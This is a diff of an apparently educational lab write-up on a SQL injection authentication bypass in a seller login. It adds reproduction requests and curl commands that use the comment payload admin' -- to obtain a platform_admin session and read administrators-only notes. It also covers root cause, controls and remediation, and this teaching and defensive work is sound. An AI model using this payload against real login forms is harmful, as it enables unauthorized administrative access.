@@ -1,7 +1,7 @@
 ---
 title: "WebVerse Tradesman — SQL Injection Authentication Bypass to Platform Admin Access"
 date: 2026-08-08T00:00:00+02:00
-lastmod: 2026-08-08T00:00:00+02:00
+lastmod: 2026-08-11T00:00:00+02:00
 draft: false
 author: "Mdk22"
 description: "A legacy seller login accepted SQL comment syntax in the handle field, bypassing password authentication and issuing a platform_admin session."
@@ -45,7 +45,7 @@ methods:
   - "Independent curl Verification"
 ---
 
-> **Publication note:** This article documents a fresh reproduction in an authorized WebVerse educational lab. Reusable session values and private raw artifacts are excluded. The current lab objective is represented publicly as `WEBVERSE{REDACTED}`.
+> **Publication note:** This article documents a fresh reproduction in an authorized WebVerse educational lab. The temporary host, fixed invalid test password, reusable session values, local cookie-jar path, and private raw artifacts are excluded. The current lab objective is represented publicly as `WEBVERSE{REDACTED}`.
 
 ## Executive Summary
 
@@ -133,7 +133,7 @@ Before introducing SQL syntax, an intentionally invalid login established the no
 POST /seller/login
 Content-Type: application/x-www-form-urlencoded
 
-handle=invalid_user%40example.local&password=WrongPass123
+handle=invalid_user%40example.local&password=<REDACTED>
 ```
 
 The application returned HTTP 200 with its explicit rejection marker:
@@ -157,7 +157,7 @@ The dashboard was also requested before exploitation. Without an authenticated s
 The first mutation placed a lone apostrophe in `handle` while retaining the same request shape and invalid password. It produced the same HTTP 200 invalid-login behavior.
 
 ```text
-handle='&password=WrongPass123
+handle='&password=<REDACTED>
 ```
 
 ![Lone-quote login control returning the normal invalid-login marker](Tradesman_Figure_04_Caido_Quote_Control.png)
@@ -172,7 +172,7 @@ The decisive request changed only `handle` to a targeted comment payload and kep
 POST /seller/login
 Content-Type: application/x-www-form-urlencoded
 
-handle=admin' -- &password=WrongPass123
+handle=admin' -- &password=<REDACTED>
 ```
 
 ![Caido request showing the controlled admin SQL comment payload with sensitive values redacted](Tradesman_Figure_05_Caido_SQLi_Request.png)
@@ -216,16 +216,131 @@ The current integration key is WEBVERSE{REDACTED}.
 
 **Figure 8 — Objective readback.** The protected notes resource confirms the authorization context and returns the public-safe, redacted lab objective. No additional internal tools or data were accessed.
 
-## 9. Independent curl Verification
+## 9. Reproduction Commands and Payloads
+
+The following blocks preserve only values and request shapes that were actually used and verified during the fresh reproduction. Copyable text is the reproducibility layer; the nearby Caido and curl figures remain the proof layer. Dynamic values are normalized with public placeholders, and no reusable session material is disclosed.
+
+### Baseline Requests
+
+`R-01` establishes the deterministic invalid-login baseline.
+
+```http
+POST /seller/login HTTP/1.1
+Host: <LAB_HOST>
+Content-Type: application/x-www-form-urlencoded
+
+handle=invalid_user%40example.local&password=<REDACTED>
+```
+
+Expected result: HTTP 200 with `Invalid handle or password`; no authenticated dashboard state is established.
+
+`P-01` is the exact deliberately invalid handle used in that baseline:
+
+```text
+invalid_user@example.local
+```
+
+The protected-resource baseline confirms that the pre-exploitation state cannot already reach the dashboard:
+
+```http
+GET /seller/dashboard HTTP/1.1
+Host: <LAB_HOST>
+```
+
+Expected result: HTTP 302 with `Location: /seller/login`.
+
+### Negative or Benign Control
+
+`P-02` tests a single SQL metacharacter without a complete bypass expression:
+
+```text
+'
+```
+
+The exact control request retained the same fixed invalid password and request contract:
+
+```http
+POST /seller/login HTTP/1.1
+Host: <LAB_HOST>
+Content-Type: application/x-www-form-urlencoded
+
+handle='&password=<REDACTED>
+```
+
+Expected result: HTTP 200 and the same invalid-login marker. This control proves that a quote alone does not authenticate the user; it does not independently prove or disprove SQL injection.
+
+### Verified Proof Payloads
+
+`P-03` is the bounded SQL comment payload that produced the controlled authentication differential. The trailing space after `--` is intentional and is retained in the full request blocks below.
+
+```text
+admin' --
+```
+
+The verified proof request changed only `handle` to `P-03` while retaining the fixed invalid password:
+
+```http
+POST /seller/login HTTP/1.1
+Host: <LAB_HOST>
+Content-Type: application/x-www-form-urlencoded
+
+handle=admin' -- &password=<REDACTED>
+```
+
+Expected result: HTTP 302 with `Location: /seller/dashboard` and `Set-Cookie: session=<REDACTED>`. This is a transition signal, not final proof on its own.
+
+The newly issued session was then replayed only to the previously protected dashboard and its linked read-only objective route:
+
+```http
+GET /seller/dashboard HTTP/1.1
+Host: <LAB_HOST>
+Cookie: session=<SESSION_COOKIE>
+```
+
+Expected result: HTTP 200 with the `admin` / `platform_admin` identity marker.
+
+```http
+GET /seller/dashboard/admin-notes HTTP/1.1
+Host: <LAB_HOST>
+Cookie: session=<SESSION_COOKIE>
+```
+
+Expected result: HTTP 200, administrators-only content, and `WEBVERSE{REDACTED}`. Literal session and current-instance flag values are intentionally not published.
+
+### Independent Command-Line Verification
+
+Two curl commands were executed during the fresh reproduction. The public forms retain the verified request semantics while replacing temporary values with placeholders. Certificate bypass was not part of the tested condition, so the working terminal's nonessential `-k` option is omitted.
+
+```bash
+curl -sS -i \
+  -c <REDACTED> \
+  --data-urlencode "handle=admin' -- " \
+  --data-urlencode "password=<REDACTED>" \
+  "https://<LAB_HOST>/seller/login"
+```
+
+Expected result: HTTP/2 302, `location: /seller/dashboard`, and `set-cookie: session=<REDACTED>`.
+
+```bash
+curl -sS -i \
+  -b <REDACTED> \
+  "https://<LAB_HOST>/seller/dashboard/admin-notes"
+```
+
+Expected result: HTTP/2 200, `admin` / `platform_admin` context, administrators-only content, and `WEBVERSE{REDACTED}`.
+
+The progression is deliberately bounded: `P-01` establishes normal rejection, `P-02` shows that a lone quote does not authenticate, and `P-03` produces the controlled transition. The usable session and privileged readback provide the semantic proof; neither a status code nor a payload string alone is treated as sufficient confirmation.
+
+## 10. Independent curl Verification
 
 The decisive flow was reproduced outside Caido so the result did not depend on Replay state or an existing browser session. curl submitted the same controlled login to a fresh cookie jar:
 
 ```bash
-curl -ksS -i \
-  -c /tmp/tradesman_session.txt \
+curl -sS -i \
+  -c <REDACTED> \
   --data-urlencode "handle=admin' -- " \
-  --data-urlencode "password=WrongPass123" \
-  "$BASE/seller/login"
+  --data-urlencode "password=<REDACTED>" \
+  "https://<LAB_HOST>/seller/login"
 ```
 
 The response again redirected to `/seller/dashboard` and issued a redacted session value.
@@ -237,16 +352,16 @@ The response again redirected to `/seller/dashboard` and issued a redacted sessi
 The same local cookie jar then reached the protected notes route with HTTP 200:
 
 ```bash
-curl -ksS -i \
-  -b /tmp/tradesman_session.txt \
-  "$BASE/seller/dashboard/admin-notes"
+curl -sS -i \
+  -b <REDACTED> \
+  "https://<LAB_HOST>/seller/dashboard/admin-notes"
 ```
 
 ![Independent curl readback of the administrators-only notes response with the objective redacted](Tradesman_Figure_10_Curl_Admin_Notes_Redacted.png)
 
 **Figure 10 — Independent readback.** The curl-created session reaches the same `admin` / `platform_admin` context and reproduces the redacted administrators-only objective.
 
-## 10. Root Cause and Classification
+## 11. Root Cause and Classification
 
 The runtime behavior is consistent with user-controlled `handle` data being incorporated into a legacy SQL authentication query without safe parameter binding. The exact query text and database engine were not observed, so the following is illustrative rather than captured source:
 
@@ -265,7 +380,7 @@ WHERE handle = 'admin' -- ...password condition...
 
 The primary mapping is [CWE-89](https://cwe.mitre.org/data/definitions/89.html): attacker-controlled input changed SQL behavior at the authentication boundary. The observed authentication bypass and notes exposure are verified consequences of that injection path, not separate asserted root-cause CWEs.
 
-## 11. False-Positive Controls
+## 12. False-Positive Controls
 
 The conclusion relies on independent controls instead of one anomalous response:
 
@@ -280,13 +395,13 @@ The conclusion relies on independent controls instead of one anomalous response:
 
 This evidence confirms SQL injection and the demonstrated authentication bypass. It does not establish source-code access, database write capability, arbitrary database extraction, command execution, or untested dashboard permissions.
 
-## 12. Impact
+## 13. Impact
 
 The verified impact is a password-authentication bypass for the demonstrated `admin` account. The server then issues a session accepted as `platform_admin`, giving access to a previously protected dashboard and its linked administrators-only notes.
 
 The confirmed lab impact is limited to reading the integration-key objective in that notes resource. The dashboard states that the account has access to internal platform tools, but no additional tool access, write actions, or unrelated data collection was tested. In a production environment, impact would depend on account privileges and the data exposed behind the affected authentication boundary.
 
-## 13. Remediation
+## 14. Remediation
 
 ### Parameterize the Login Query
 
@@ -304,7 +419,7 @@ Rotate the key exposed in the administrators-only notes and invalidate the old v
 
 Audit seller, vendor, staff, and back-office routes that survived frontend rewrites or migrations. Add regression tests for apostrophes, SQL comment syntax, and other metacharacters in authentication fields.
 
-## 14. Validation After the Fix
+## 15. Validation After the Fix
 
 - Invalid credentials should retain the rejection path and never issue an authenticated session.
 - Apostrophes and SQL comment syntax should remain literal input rather than changing query structure.
